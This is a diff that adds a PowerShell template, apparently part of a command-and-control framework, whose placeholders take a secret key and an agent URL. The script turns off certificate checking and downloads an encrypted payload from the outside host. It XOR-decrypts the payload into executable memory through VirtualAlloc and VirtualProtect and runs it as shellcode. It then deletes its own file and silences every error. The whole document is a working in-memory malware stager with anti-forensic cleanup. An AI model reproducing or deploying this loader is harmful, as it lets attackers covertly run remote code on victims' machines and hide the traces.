@@ -1,0 +1,60 @@
+try {{
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
+    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+
+    $SecretKey = '{secret_key}'
+
+    $DownloadUrl = '{full_agent_url}'
+    $Response = Invoke-WebRequest -Uri $DownloadUrl -SkipCertificateCheck -ErrorAction Stop
+    $EncryptedAgentContent = $Response.Content
+    
+    $EncryptedAgentContent = $EncryptedAgentContent.Trim()
+    $EncryptedAgentContent = $EncryptedAgentContent -replace '[\\r\\n\\t]', ''
+    $EncryptedAgentContent = $EncryptedAgentContent.Trim()
+
+    try {{
+        $EncryptedAgentBytes = [System.Convert]::FromBase64String($EncryptedAgentContent)
+    }} catch {{
+        # If not base64, assume it's already the raw encrypted bytes
+        $EncryptedAgentBytes = [System.Text.Encoding]::UTF8.GetBytes($EncryptedAgentContent)
+    }}
+
+    $SecretKeyBytes = [System.Text.Encoding]::UTF8.GetBytes($SecretKey)
+    $DecryptedBytes = [byte[]]::new($EncryptedAgentBytes.Length)
+    for ($i = 0; $i -lt $EncryptedAgentBytes.Length; $i++) {{
+        $DecryptedBytes[$i] = $EncryptedAgentBytes[$i] -bxor $SecretKeyBytes[$i % $SecretKeyBytes.Length]
+    }}
+
+    $Win32Type = @'
+    using System;
+    using System.Runtime.InteropServices;
+    public class Win32 {{
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+    }}
+'@
+    Add-Type -TypeDefinition $Win32Type
+
+    $Size = $DecryptedBytes.Length
+    $Addr = [Win32]::VirtualAlloc(0, $Size, 0x1000, 0x40)  # MEM_COMMIT | PAGE_EXECUTE_READWRITE
+    
+    for ($i = 0; $i -lt $Size; $i++) {{
+        [System.Runtime.InteropServices.Marshal]::WriteByte($Addr, $i, $DecryptedBytes[$i])
+    }}
+    
+    [uint32]$OldProtect = 0
+    [Win32]::VirtualProtect($Addr, $Size, 0x40, [ref]$OldProtect)
+    
+    # Use GetDelegateForFunctionPointer to create a delegate that points to the shellcode and execute it
+    $HInstance = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($Addr, [type][System.Action])
+    $HInstance.Invoke()
+
+    Start-Sleep -Seconds 2
+    $CurrentScript = $MyInvocation.MyCommand.Path
+    Remove-Item -Path $CurrentScript -Force -ErrorAction SilentlyContinue
+
+}} catch {{
+    # Silently handle failures
+}}
